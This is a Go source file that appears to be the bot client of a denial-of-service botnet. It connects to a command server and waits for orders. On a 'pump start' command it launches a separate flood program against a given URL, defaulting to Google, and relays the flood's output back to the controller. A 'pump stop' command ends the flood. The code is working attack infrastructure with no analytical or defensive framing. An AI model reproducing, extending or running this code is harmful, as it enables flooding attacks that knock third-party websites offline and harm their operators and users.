package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	floodActive = false
	floodLock   sync.Mutex
	stopFlood   = make(chan struct{}) // Signal to stop the flood operation
)

func main() {
	commanderAddress := "127.0.0.1:8080"
	conn, err := net.Dial("tcp", commanderAddress)
	if err != nil {
		fmt.Println("Error connecting to commander:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to commander.")

	reader := bufio.NewReader(conn)
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			break
		}
		processCommand(strings.TrimSpace(command), conn)
	}
}

func processCommand(command string, conn net.Conn) {
	parts := strings.Fields(command)
	if parts[0] == "pump" {
		floodLock.Lock()
		defer floodLock.Unlock()

		switch parts[1] {
		case "start":
			if len(parts) < 3 {
				fmt.Fprintln(conn, "Error: URL not specified. Defaulting to http://www.google.com")
                time.Sleep(1 * time.Second)


				parts = append(parts, "http://www.google.com")

				floodActive = true
				go executeDemonGo(parts[2:], conn)
				fmt.Fprintln(conn, "Flood operation started for URL:", parts[2])

				return
			}
			if floodActive {
				fmt.Fprintln(conn, "Flood operation is already active. Stop it before starting a new one.")
				return
			}
			floodActive = true
			go executeDemonGo(parts[2:], conn)
			fmt.Fprintln(conn, "Flood operation started for URL:", parts[2])
		case "stop":
			if !floodActive {
				fmt.Fprintln(conn, "No active flood operation to stop.")
				return
			}
			close(stopFlood) // Signal to stop the flood operation
			floodActive = false
			fmt.Fprintln(conn, "Flood operation stopped.")
			stopFlood = make(chan struct{}) // Reset the stop signal channel
		default:
			fmt.Fprintln(conn, "Invalid command. Use 'start' or 'stop'.")
		}
	} else {
		fmt.Fprintf(conn, "Unknown command: %s\n", parts[0])
	}
}

func executeDemonGo(args []string, conn net.Conn) {
	cmd := exec.Command("go", append([]string{"run", "demon/demon.go"}, args...)...)

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Fprintln(conn, "Error creating stdout pipe:", err)
		return
	}

	if err := cmd.Start(); err != nil {
		fmt.Fprintln(conn, "Error starting command:", err)
		return
	}

	// Use a goroutine to copy the command's output to the connection continuously.
	go io.Copy(conn, stdoutPipe)

	// Wait for the command to finish or be stopped.
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-stopFlood: // If a stop signal is received, try to terminate the process
		if err := cmd.Process.Kill(); err != nil {
			fmt.Fprintln(conn, "Failed to stop the flood operation:", err)
		}
	case err := <-done: // Command completed on its own
		if err != nil {
			fmt.Fprintf(conn, "Flood operation finished with error: %v\n", err)
		} else {
			fmt.Fprintln(conn, "Flood operation finished successfully.")
		}
	}
}
